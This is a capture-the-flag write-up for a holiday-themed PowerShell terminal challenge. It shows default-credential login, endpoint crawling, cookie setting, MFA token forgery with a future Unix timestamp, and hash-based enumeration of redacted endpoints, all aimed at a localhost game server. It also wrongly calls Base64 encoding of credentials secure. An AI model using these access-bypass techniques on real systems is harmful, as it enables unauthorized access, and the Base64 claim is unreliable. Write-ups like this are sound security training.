# PowerShell

## Table of Contents
- [PowerShell](#powershell)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
  - [Welcome Screen](#welcome-screen)
  - [Silver](#silver)
    - [Task 1](#task-1)
    - [Task 2](#task-2)
    - [Task 3](#task-3)
    - [Task 4](#task-4)
    - [Task 5](#task-5)
    - [Task 6](#task-6)
    - [Task 7](#task-7)
    - [Task 8](#task-8)
    - [Task 9](#task-9)
    - [Task 10](#task-10)
    - [Task 11](#task-11)
    - [Solution](#solution)
  - [Gold](#gold)
    - [Hints](#hints)
      - [PowerShell Admin Access - Total Control](#powershell-admin-access---total-control)
      - [PowerShell Admin Access - Fakeout EDR Threshold](#powershell-admin-access---fakeout-edr-threshold)
    - [Analysis](#analysis)
    - [Solution](#solution-1)
  - [Files](#files)
  - [References](#references)
  - [Navigation](#navigation)

---

## Overview

Hey there, friend! Piney Sappington here.

You’ve probably heard the latest—things are getting tense around here with all the faction business between Wombley and Alabaster. But, let’s focus on this PowerShell Terminal for now.

This is the remote access for our snowball weaponry. We programmed some defense mechanisms to deter intruders, but the system is in a faulty lockdown state.

I certainly wasn’t the one that programmed the mechanism. Nope not me. But can you help me find a way through it so I can regain access?

There’s two functions I need access to. The snow cannon terminal, which should be easier. And the snow cannon production and deployment plans. That one’s better defended.

Still, I’ve got faith in you. We need every advantage we can get right now, and you might be just the one to tip the balance.

So, think you can do it? Are you ready to show what you’ve got?

---

## Welcome Screen
Upon opening the challenge, we’re greeted with a terminal. It looks a lot like the [cURLing](../../act-i/curling/README.md) challenge from before, but this time we’ll have to use PowerShell to solve it.

```ps
Welcome to PowerShell MFA challenge!
Type hintme for hints.

---------------------------------------------

Are you ready to begin? [y]es:
```

Let's enter "y" and press Enter to start the challenge.

## Silver

### Task 1
```
1) There is a file in the current directory called 'welcome.txt'. Read the contents of this file.
```

Let's use the `Get-Content` cmdlet.
```ps
Get-Content -Path welcome.txt
```
```
System Overview
The Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to a classified armory containing elf weapons. This high-security system is equipped with advanced defense mechanisms, including canaries, retinal scanner and keystroke analyzing, to prevent unauthorized access. In the event of suspicious activity, the system automatically initiates a lockdown, restricting all access until manual override by authorized personnel.

Lockdown Protocols
When the system enters lockdown mode, all access to the armory is frozen. This includes both entry to and interaction with the weaponry storage. The defense mechanisms become active, deploying logical barriers to prohibit unauthorized access. During this state, users cannot disable the system without the intervention of an authorized administrator. The system logs all access attempts and alerts central command when lockdown is triggered.

Access and System Restoration
To restore access to the system, users must follow strict procedures. First, authorized personnel must identify the scrambled endpoint. Next, they must deactivate the defense mechanisms by entering the override code and presenting the required token. After verification, the system will resume standard operation, and access to weaponry is reactivated.

```

### Task 2
```
2) Geez that sounds ominous. I'm sure we can get past the defense mechanisms.
We should warn up our PowerShell skills. 
How many words are there in the file.
```

Let's use the `Measure-Object` cmdlet.
```ps
Get-Content -Path welcome.txt | Measure-Object -Word
```
```
Lines Words Characters Property
----- ----- ---------- --------
        180
```

### Task 3
```
3) There is a server listening for incoming connections on this machine, that must be the weapons terminal. What port is it listening on?
```
Let's use `netstat` to find a server on the local machine.
```
netstat -a
```
```
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address          Foreign Address         State
tcp        0      0 localhost:1225         0.0.0.0:*               LISTEN
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type      State        I-Node     Path
unix  2      [ ACC ]     STREAN    LISTENING    1295567011 /tmp/tmux-150/default
unix  2      [ ACC ]     STREAN    LISTENING    1295569430 /tmp/dotnet-diagnostics-135-300352533-socket
unix  2      [ ACC ]     STREAN    LISTENING    1295569474 /tmp/CoreFxPipe_PSHost.DB5D0A92.135.None.pwsh
unix  3      [ ]         STREAN    CONNECTED    1295568956
unix  3      [ ]         STREAN    CONNECTED    1295568956 /tmp/tmux-150/default
```

### Task 4
```
4) You should enumerate that webserver. Communicate with the server using HTTP, what status code do you get?
```

Let's send a web request to the server.
```ps
Invoke-WebRequest -Uri "http://localhost:1225"
```
```
Invoke-WebRequest: Response status code does not indicate success: 401 (UNAUTHORIZED).
```

### Task 5
```
5) It looks like defensive measures are in place, it is protected by basic authentication.
Try authenticating with a standard username and password.
```
Let's send HTTP Basic authentication credentials with a standard admin username and password `admin:admin`.

PowerShell is blocking the transmission of plaintext credentials over an unencrypted connection (HTTP). To bypass this and proceed with basic authentication, we can use the `-AllowUnencryptedAuthentication` parameter:
```ps
$cred = New-Object System.Management.Automation.PSCredential("admin", (ConvertTo-SecureString "admin" -AsPlainText -Force))  
Invoke-WebRequest -Uri http://127.0.0.1:1225 -Credential $cred -AllowUnencryptedAuthentication -Verbose
```

Another way to send the credentials in a secure way over HTTP is to encrypt credentials locally by Base64, encode the credentials manually, and send them in the `Authorization header:`.
```ps
$authHeader = @{ Authorization = "Basic $( [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')) )" }
Invoke-WebRequest -Uri http://127.0.0.1:1225 -Method GET -Headers $authHeader
```

```ps
StatusCode        : 200
StatusDescription : OK
Content           : <html>
                    <body>
                    <pre>
                    ----------------------------------------------------
                    🪖 Elf MFA webserver🪖
                    ⚔️ Grab your tokens for access to weaponry ⚔️
                    ⚔️ Warning! Sensitive information on the server, protect a…
RawContent        : HTTP/1.1 200 OK
                    Server: Werkzeug/3.0.6
                    Server: Python/3.10.12
                    Date: Tue, 19 Nov 2024 05:16:41 GMT
                    Connection: close
                    Content-Type: text/html; charset=utf-8
                    Content-Length: 3475
                    
                    <html>
                    <body>
                    <pre>
                    ---…
Headers           : {[Server, System.String[]], [Date, System.String[]], [Connection, System.S
                    tring[]], [Content-Type, System.String[]]…}
Images            : {}
InputFields       : {}
Links             : {@{outerHTML=<a href="http://localhost:1225/endpoints/1">Endpoint 1</a>; t
                    agName=A; href=http://localhost:1225/endpoints/1}, @{outerHTML=<a href="ht
                    tp://localhost:1225/endpoints/2">Endpoint 2</a>; tagName=A; href=http://lo
                    calhost:1225/endpoints/2}, @{outerHTML=<a href="http://localhost:1225/endp
                    oints/3">Endpoint 3</a>; tagName=A; href=http://localhost:1225/endpoints/3
                    }, @{outerHTML=<a href="http://localhost:1225/endpoints/4">Endpoint 4</a>;
                     tagName=A; href=http://localhost:1225/endpoints/4}…}
RawContentLength  : 3475
RelationLink      : {}
```

### Task 6
```
6) There are too many endpoints here.
Use a loop to download the contents of each page. What page has 138 words?
When you find it, communicate with the URL and print the contents to the terminal.
```

We can list all the endpoints looping over the `Links`:
```ps
# Fetch the main page that lists the endpoints
$response = Invoke-WebRequest -Uri http://127.0.0.1:1225 -Headers $authHeader

# Extract all the links (endpoints) from the page
$links = $response.Links | Where-Object { $_.outerHTML -match "endpoints/\d+" } | Select-Object -ExpandProperty href

# Loop through each endpoint
foreach ($endpoint in $links) {
    Write-Host "$Endpoint: $endpoint"
}
```

To get the page with specifically 138 words, we can check each page's content and stop when we find the one that matches:
```ps
# Fetch the main page that lists the endpoints
$authHeader = @{ Authorization = "Basic $( [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin')) )" }
$response = Invoke-WebRequest -Uri http://127.0.0.1:1225 -Method GET -Headers $authHeader

# Extract all the links (endpoints) from the page
$links = $response.Links | Where-Object { $_.outerHTML -match "endpoints/\d+" } | Select-Object -ExpandProperty href

# Loop through each endpoint
foreach ($endpoint in $links) {
    $response = Invoke-WebRequest -Uri $endpoint -Headers $authHeader
    $content = $response.Content

    # Count the number of words in the page content
    $wordCount = ($content -split '\s+').Length

    # If the word count is 138, print the content
    if ($wordCount -eq 138) {
        Write-Host "Found endpoint with 138 words: $endpoint"
        Write-Host "Content: "
        Write-Host $content
        break
    }
}
```
```html
Found endpoint with 138 words: http://localhost:1225/endpoints/13
Content:
<html><head><title>MFA token scrambler</title></head><body><p>Yuletide cheer fills the air,<br>    A season of love, of care.<br>    The world is bright, full of light,<br>    As we celebrate this special night.<br>    The tree is trimmed, the stockings hung,<br>    Carols are sung, bells are rung.<br>    Families gather, friends unite,<br>    In the glow of the fire’s light.<br>    The air is filled with joy and peace,<br>    As worries and cares find release.<br>    Yuletide cheer, a gift so dear,<br>    Brings warmth and love to all near.<br>    May we carry it in our hearts,<br>    As the season ends, as it starts.<br>    Yuletide cheer, a time to share,<br>    The love, the joy, the care.<br>    May it guide us through the year,<br>    In every laugh, in every tear.<br>    Yuletide cheer, a beacon bright,<br>    Guides us through the winter night </p><p> Note to self, remember to remove temp csvfile at http://127.0.0.1:1225/token_overview.csv</p></body></html>
```

### Task 7
```
7) There seems to be a csv file in the comments of that page.
 That could be valueable, read the contents of the csv-file!
```
```ps
$response = Invoke-WebRequest -Uri http://127.0.0.1:1225/token_overview.csv -Headers $authHeader
Write-Host $response.Content
```
```
file_MD5hash,Sha256(file_MD5hash)
04886164e5140175bafe599b7f1cacc8,REDACTED
664f52463ef97bcd1729d6de1028e41e,REDACTED
3e03cd0f3d335c6fb50122553f63ef78,REDACTED
f2aeb18f5b3f08420eed9b548b6058c3,REDACTED
32b9401a6d972f8c1a98de145629ea9d,REDACTED
3a79238df0a92ab0afa44a85f914fc3b,REDACTED
49c2a68b21b9982aa9fd64cf0fd79f72,REDACTED
f8142c1304efb9b7e9a7f57363c2d286,REDACTED
706457f6dd78729a8bed5bae1efaeb50,REDACTED
bb0564aa5785045937a35a9fa3fbbc73,REDACTED
4173a7bc22aee35c5fc48261b041d064,REDACTED
198b8bf2cd30a7c7fed464cca1720a88,REDACTED
3a7c8ecffeeadb164c31559f8f24a1e7,REDACTED
288e60e318d9ad7d70d743a614442ffc,REDACTED
87ab4cb29649807fdb716ac85cf560ea,REDACTED
89f3ec1275407c9526a645602d56e799,REDACTED
33539252b40b5c244b09aee8a57adbc9,REDACTED
152899789a191d9e9150a1e3a5513b7f,REDACTED
7cd48566f118a02f300cdfa75dee7863,REDACTED
d798a55fca64118cea2df3c120f67569,REDACTED
6ef5570cd43a3ec9f43c57f662201e55,REDACTED
bf189d47c3175ada98af398669e3cac3,REDACTED
743ac25389a0b430dd9f8e72b2ec9d7f,REDACTED
270aabd5feaaf40185f2effa9fa2cd6e,REDACTED
8b58850ee66bd2ab7dd2f5f850c855f8,REDACTED
6fd00cbda10079b1d55283a88680d075,REDACTED
612001dd92369a7750c763963bc327f0,REDACTED
010f2cc580f74521c86215b7374eead6,REDACTED
29860c67296d808bc6506175a8cbb422,REDACTED
7b7f6891b6b6ab46fe2e85651db8205f,REDACTED
45ffb41c4e458d08a8b08beeec2b4652,REDACTED
d0e6bfb6a4e6531a0c71225f0a3d908d,REDACTED
bd7efda0cb3c6d15dd896755003c635c,REDACTED
5be8911ced448dbb6f0bd5a24cc36935,REDACTED
1acbfea6a2dad66eb074b17459f8c5b6,REDACTED
0f262d0003bd696550744fd43cd5b520,REDACTED
8cac896f624576d825564bb30c7250eb,REDACTED
8ef6d2e12a58d7ec521a56f25e624b80,REDACTED
b4959370a4c484c10a1ecc53b1b56a7d,REDACTED
38bdd7748a70529e9beb04b95c09195d,REDACTED
8d4366f08c013f5c0c587b8508b48b15,REDACTED
67566692ca644ddf9c1344415972fba8,REDACTED
8fbf4152f89b7e309e89b9f7080c7230,REDACTED
936f4db24a290032c954073b3913f444,REDACTED
c44d8d6b03dcd4b6bf7cb53db4afdca6,REDACTED
cb722d0b55805cd6feffc22a9f68177d,REDACTED
724d494386f8ef9141da991926b14f9b,REDACTED
67c7aef0d5d3e97ad2488babd2f4c749,REDACTED
5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
# [*] SYSTEMLOG
# [*] Defence mechanisms activated, REDACTING endpoints, starting with sensitive endpoints
# [-] ERROR, memory corruption, not all endpoints have been REDACTED
# [*] Verification endpoint still active
# [*] http://127.0.0.1:1225/tokens/<sha256sum>
# [*] Contact system administrator to unlock panic mode
# [*] Site functionality at minimum to keep weapons active
```

### Task 8
```
8) Luckily the defense mechanisms were faulty!
There seems to be one api-endpoint that isn't redacted! Communicate with that endpoint!
```

The URL format for the verification endpoint is explained in the end of the output: `http://127.0.0.1:1225/tokens/<sha256sum>`.

Let's send a request with the unredacted value:
```ps
$response = Invoke-WebRequest -Uri http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Headers $authHeader
Write-Host $response.Content
```
```
<h1>[!] ERROR: Missing Cookie 'token'</h1>k
```

### Task 9
```
9) It looks like it requires a cookie token, set the cookie and try again.
```

The cookie token value is the M5D hash from the CSV file: `5f8dd236f862f4507835b0e418907ffc`. Let's set it in the header and submit the request again:
```ps
# Create a web session
$webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession

# Add the 'token' cookie to the session
$webSession.Cookies.Add((New-Object System.Net.Cookie("token", "5f8dd236f862f4507835b0e418907ffc", "/", "127.0.0.1")))

# Retry the request with the session containing the cookie
$response = Invoke-WebRequest -Uri http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Headers $authHeader -WebSession $webSession

# Display the response content
Write-Host = $response.Content
```
```html
<h1>Cookie 'mfa_code', use it at <a href='1731995946.5325444'>/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C</a></h1>
```

### Task 10
```
10) Sweet we got a MFA token! We might be able to get access to the system.
 Validate that token at the endpoint!
```

Let's send another request with another cookie to a different endpoint:

> **Note:** Originally tried sending a request using the `mfa_code` cookie as it suggests in the message, but it complained that it was missing the `mfa_token` cookie.

```ps
# Add the MFA cookie to the session
$webSession.Cookies.Add((New-Object System.Net.Cookie("mfa_token", "1731995946.5325444", "/", "127.0.0.1")))

$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Headers $authHeader -WebSession $webSession
Write-Host $response.Content
```
```html
<h1>[!] System currently in lock down</h1><br><h1>[!] Failure, token has expired. [*] Default timeout set to 2s for security reasons</h1>
```

To solve the issue of the token expiration, we have two different methods.

1. **Automation:** request a new MFA token, grab the value from the response automatically using a regex or the `Links` attribute, and sent it along in the request.
   ```ps
   # This request will return the temporary 'mfa_token' value.
   $response = Invoke-WebRequest -Uri http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Headers $authHeader -WebSession $webSession

   # Extract the token (the value inside the <a href=''> tag)
   $token = $response.Links[0].href

   # Set the extracted token as a cookie for the next request
   $webSession.Cookies.Add((New-Object System.Net.Cookie("mfa_token", $token, "/", "127.0.0.1")))

   # Now send the next request with the mfa_token cookie set
   $nextResponse = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Headers $authHeader -WebSession $webSession

   # Display the response content of the validation request
   Write-Host $nextResponse.Content
   ```

2. **Unix Time Stamp:** the MFA token format looks like a [Unix time stamp](https://www.unixtimestamp.com/). Every time you request one, the value increases slightly depending on time, and the value seems to align to the current time. We can create a time stamp far ahead in the future and use it for the request.
   ```ps
   # Set the crafted token as a cookie for the next request
   $webSession.Cookies.Add((New-Object System.Net.Cookie("mfa_token", 2735818892.786766, "/", "127.0.0.1")))

   # Now send the next request with the mfa_token cookie set
   $response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Headers $authHeader -WebSession $webSession

   # Display the response content of the validation request
   Write-Host $response.Content
   ```

Either way, we get a valid response:
```html
<h1>[+] Success</h1><br><p>Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==</p>
```

### Task 11
```
11) That looks like base64! Decode it so we can get the final secret!
```

Although the ability to bas64 decode a string is not available in PowerShell itself, we can use some methods from the [System namespace from .NET](https://learn.microsoft.com/en-us/dotnet/api/system).
```ps
# Base64 encoded string
$encodedString = "Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg=="

# Decode from Base64
$decodedString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedString))

# Output the decoded string
Write-Host $decodedString
```
```
Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: `SnowLeopard2ReadyForAction`
```

### Solution
```
Hurray! You have thwarted their defense!
Alabaster can now access their weaponry and put a stop to it.
Once HCC grants your achievement, you can close this terminal.
```

> **Note:** The [`all_steps.ps1`](./all_steps.ps1) PowerShell script can be used to automate all 11 steps.

**Flag (Silver):** `SnowLeopard2ReadyForAction`

---

## Gold

Fantastic work! You’ve navigated PowerShell’s tricky waters and retrieved the codeword—just what we need in these uncertain times. You’re proving yourself a real asset!

I’ll let you in on a little secret—there’s a way to bypass the usual path and write your own PowerShell script to complete the challenge. Think you’re up for it? I know you are!

Well done! you’ve demonstrated solid PowerShell skills and completed the challenge, giving us a bit of an edge. Your persistence and mastery are exactly what we need—keep up the great work!

### Hints

#### PowerShell Admin Access - Total Control
I overheard some of the other elves talking. Even though the endpoints have been redacted, they are still operational. This means that you can probably elevate your access by communicating with them. I suggest working out the hashing scheme to reproduce the redacted endpoints. Luckily one of them is still active and can be tested against. Try hashing the token with SHA256 and see if you can reliably reproduce the endpoint. This might help, pipe the tokens to Get-FileHash -Algorithm SHA256.

#### PowerShell Admin Access - Fakeout EDR Threshold
They also mentioned this lazy elf who programmed the security settings in the weapons terminal. He created a fakeout protocol that he dubbed Elf Detection and Response “EDR”. The whole system is literally that you set a threshold and after that many attempts, the response is passed through… I can’t believe it. He supposedly implemented it wrong so the threshold cookie is highly likely shared between endpoints!

### Analysis
The hints indicate that we need to generate a hash for a redacted token.

The hint suggest to hash to token with SHA256, which confirms the information provided in the CSV file header. It also mentions to pipe the tokens to `Get-FileHash -Algorithm SHA256`. This might generate different results due to how it processes input since the command expects a file or a stream instead of a text value.

One thing to note is that files often have a newline character at the end. Hence, if using a stream or any implementation that does not the hash in a file, we need to make sure to add a newline character to the MD5 hash to simulate line feed behavior when the value is piped as input to the PowerShell command and put into a file.

First, let's use the unredacted token as a reference to confirm the logic is valid.

**Using PowerShell:**
```ps
# Known MD5 hash and SHA256 value for verification
$test_md5 = "5f8dd236f862f4507835b0e418907ffc"
$expected_sha256 = "4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C"

# Verify the known value
$test_md5 | Set-Content temp.txt
$result = Get-FileHash temp.txt -Algorithm SHA256
$actual_sha256 = $result.Hash
if ($actual_sha256 -ieq $expected_sha256) {
    Write-Output "Verification successful!"
} else {
    Write-Output "Verification failed!"
}
```
```
Verification successful!
```

**Using Python:**
```python
# Known MD5 hash and SHA256 value for verification
md5 = "5f8dd236f862f4507835b0e418907ffc"
sha256_expected = "4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C"
print(f"Expected SHA256: {sha256_expected}")

# MD5 hash with newline character
md5_with_newline = f"{md5}\n"
sha256_actual = hashlib.sha256(md5_with_newline.encode()).hexdigest().upper()
print(f"  Actual SHA256: {sha256_actual}")

# Compare with the expected value
if sha256_expected == sha256_actual:
    print("Values match!")
else:
    print("Values do not match!")
```
```
Expected SHA256: 4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
  Actual SHA256: 4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
Values match!
```

**Using CyberChef:**
We can create a [recipe](https://gchq.github.io/CyberChef/#recipe=SHA2%28%27256%27,64,160%29&input=NWY4ZGQyMzZmODYyZjQ1MDc4MzViMGU0MTg5MDdmZmM) for a simple SHA256 hash of the input (with the newline characterat the end).

The outcome confirms that the logic is correct.

Let's regenerate the list of SHA256 hashes for all MD5 entries with the [`get_sha256sum.ps1`](./get_sha256sum.ps1) PowerShell script. We can also use the [`get_sha256sum.py`](./get_sha256sum.py) Python script to confirm.

The [`all_hashes.txt`](./all_hashes.txt) file contains all the hashes and generated tokens.

### Solution

Let's loop over all the generated tokens using the [`check_tokens.ps1`](./check_tokens.ps1) PowerShell script.

All the responses are provided in the [`last_output.txt`](./last_output.txt) file.

After running this, we get the Gold medal.

```
Incredible! You tackled the hard path and showed off some serious PowerShell expertise. This kind of skill is exactly what we need, especially with things heating up between the factions.
```

---

## Files

| File | Description |
|---|---|
| `all_steps.ps1` | PowerShell script automating all 11 Silver tasks |
| `get_sha256sum.ps1` | PowerShell script to generate SHA256 hashes from MD5 tokens |
| `get_sha256sum.py` | Python equivalent of `get_sha256sum.ps1` |
| `all_hashes.txt` | All MD5 tokens paired with their generated SHA256 hashes |
| `check_tokens.ps1` | PowerShell script looping over all generated tokens for Gold |
| `last_output.txt` | Output from running `check_tokens.ps1` |

## References

- [`ctf-techniques/web/curl/`](../../../../../ctf-techniques/web/curl/README.md) — HTTP request techniques (PowerShell `Invoke-WebRequest` parallels `curl`)
- [`ctf-techniques/crypto/`](../../../../../ctf-techniques/crypto/README.md) — hash reference (SHA256, MD5, Base64)
- [PowerShell Invoke-WebRequest](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)
- [PowerShell Get-FileHash](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash)
- [CyberChef SHA256](https://gchq.github.io/CyberChef/#recipe=SHA2%28%27256%27,64,160%29)
- [Unix timestamp converter](https://www.unixtimestamp.com/)

---

## Navigation

| | |
|:---|---:|
| ← [Mobile Analysis](../mobile-analysis/README.md) | [Snowball Showdown](../snowball-showdown/README.md) → |
